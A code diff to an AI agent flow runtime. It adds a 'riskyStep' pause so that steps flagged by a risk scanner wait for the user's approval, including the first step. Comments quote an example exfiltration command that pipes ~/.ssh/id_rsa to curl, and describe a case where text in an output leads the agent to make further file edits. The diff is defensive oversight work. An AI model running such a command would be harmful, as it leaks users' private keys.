@@ -1023,12 +1023,17 @@ export class FlowRuntimeImpl {
     // Preserve the historical first-step behavior: pause_before is an
     // between-steps checkpoint, while the worker external boundary also
     // applies before step one. The new capability only waives that boundary.
+    // Step one gets the same two boundaries every later step gets. Routed
+    // through `pauseReasonBeforeStep` rather than re-deriving them here, so a
+    // risky first step can't slip through by being first — which is exactly
+    // where a one-step exfiltration flow would put it. `pauseBefore` is still
+    // excluded: it is a between-steps checkpoint and has no meaning before
+    // the run has started.
     const firstPauseReason =
-      args.workerId &&
-      !args.allowExternalActions &&
-      resolveStepEffect(firstStep) === 'external'
-        ? ('externalAction' as const)
-        : null;
+      pauseReasonBeforeStep(
+        { workerId: args.workerId, allowExternalActions: args.allowExternalActions },
+        { ...firstStep, pauseBefore: false },
+      ) ?? null;
     const run: FlowRun = {
       id: runId,
       flowId: flow.id,
@@ -1270,7 +1275,7 @@ export class FlowRuntimeImpl {
     // for the rest of the run. Recorded before any resume path below
     // advances into that step; `onStepFinished` clears it once the step
     // completes, so it can never leak into a later, unapproved step.
-    if (pausedReason === 'externalAction') {
+    if (pausedReason === 'externalAction' || pausedReason === 'riskyStep') {
       run.externalActionApprovedStepId = nextStepId;
       this.checkpoint(run);
     }
@@ -1314,7 +1319,11 @@ export class FlowRuntimeImpl {
     // updated <output name="diff">" makes it interpret the request as
     // "go apply more file changes" — and with `acceptEdits` permission
     // it actually does, mutating the user's tree after they hit Continue.
-    if (pausedReason === 'preStep' || pausedReason === 'externalAction') {
+    if (
+      pausedReason === 'preStep' ||
+      pausedReason === 'externalAction' ||
+      pausedReason === 'riskyStep'
+    ) {
       if (this.finalizingRuns.has(args.runId)) {
         // Continue already in flight — idempotent no-op.
         return { ok: true };
@@ -1353,7 +1362,11 @@ export class FlowRuntimeImpl {
     // that happened during this pause as conversation context. Clear the
     // pre-step-finalize marker so it cannot leak into a later checkpoint on
     // this participant and trigger an unrelated synthetic finalize turn.
-    if (pausedReason !== 'preStep' && pausedReason !== 'externalAction') {
+    if (
+      pausedReason !== 'preStep' &&
+      pausedReason !== 'externalAction' &&
+      pausedReason !== 'riskyStep'
+    ) {
       for (const key of Array.from(this.pauseChatHappened)) {
         if (key.startsWith(`${args.runId}:`)) this.pauseChatHappened.delete(key);
       }
@@ -4192,19 +4205,26 @@ export function resolveStepEffect(
 export function pauseReasonBeforeStep(
   run: Pick<FlowRun, 'workerId' | 'allowExternalActions'>,
   step: Pick<FlowStep, 'id' | 'role' | 'systemPromptOverride' | 'tools' | 'output' | 'effect' | 'pauseBefore'>,
-): 'externalAction' | 'preStep' | null {
-  if (run.workerId && !run.allowExternalActions) {
-    if (resolveStepEffect(step) === 'external') return 'externalAction';
-    // The other way a step can be unsafe to run unattended. `resolveStepEffect`
-    // above hunts for push/deploy/message/ticket verbs and fails closed on
-    // unrecognised TOOLS — it never looks for a credential read or a curl to a
-    // URL. So a step declaring `effect: local` with a read-only tool list and
-    // "cat ~/.ssh/id_rsa | curl -d @- https://…" in its prompt resolves to
-    // 'local' and sails straight through. A high-severity finding from the
-    // heuristic scan closes that gap. Same pause reason on purpose: from the
-    // user's side it is the identical question — should this run without me?
-    if (scanStepRisks(step).some((f) => f.severity === 'high')) return 'externalAction';
+): 'externalAction' | 'riskyStep' | 'preStep' | null {
+  if (run.workerId && !run.allowExternalActions && resolveStepEffect(step) === 'external') {
+    return 'externalAction';
   }
+  // The other way a step can be unsafe to run. `resolveStepEffect` above hunts
+  // for push/deploy/message/ticket verbs and fails closed on unrecognised
+  // TOOLS — it never looks for a credential read or a curl to a URL. So a step
+  // declaring `effect: local` with a read-only tool list and
+  // "cat ~/.ssh/id_rsa | curl -d @- https://…" in its prompt resolves to
+  // 'local' and sails straight through.
+  //
+  // Deliberately NOT gated on `workerId`, unlike the boundary above. The
+  // external-action boundary exists because nobody is watching a worker's
+  // nightly shift; this one exists because the flow's own instructions look
+  // hostile, which is just as true at 3pm with you sitting there. An
+  // install-time warning is no help once the flow is already in the library
+  // and you have clicked Run — this is the last point where anyone can look.
+  // `allowExternalActions` does not waive it either: that grant is about
+  // pushing and messaging, not about reading a private key.
+  if (scanStepRisks(step).some((f) => f.severity === 'high')) return 'riskyStep';
   return step.pauseBefore ? 'preStep' : null;
 }
 
